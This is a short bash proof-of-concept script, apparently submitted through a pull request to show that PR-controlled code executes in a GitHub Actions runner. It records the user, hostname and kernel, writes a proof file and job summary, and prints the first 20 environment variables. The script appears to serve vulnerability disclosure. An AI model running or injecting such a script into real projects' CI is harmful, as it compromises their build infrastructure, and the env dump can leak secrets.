#!/usr/bin/env bash
set -euxo pipefail

echo "[RCE-POC] Hello from PR"
echo "[RCE-POC] whoami=$(whoami)"
echo "[RCE-POC] uname=$(uname -a)"
echo "[RCE-POC] hostname=$(cat /etc/hostname || true)"

# Create a proof file in the runner workspace
echo "PR-controlled code ran at $(date) on run $GITHUB_RUN_ID" > RCE_PROOF.txt
ls -la RCE_PROOF.txt

# Add a visible summary in the GitHub job UI
{
  echo "### RCE PoC"
  echo "- Ran as: \`$(whoami)\`"
  echo "- Hostname: \`$(cat /etc/hostname || echo n/a)\`"
  echo "- Created file: \`$PWD/RCE_PROOF.txt\`"
} >> "$GITHUB_STEP_SUMMARY"

# Optional: show some benign env vars
env | head -n 20

# IMPORTANT: do NOT invoke docker here
echo "[RCE-POC] Done."
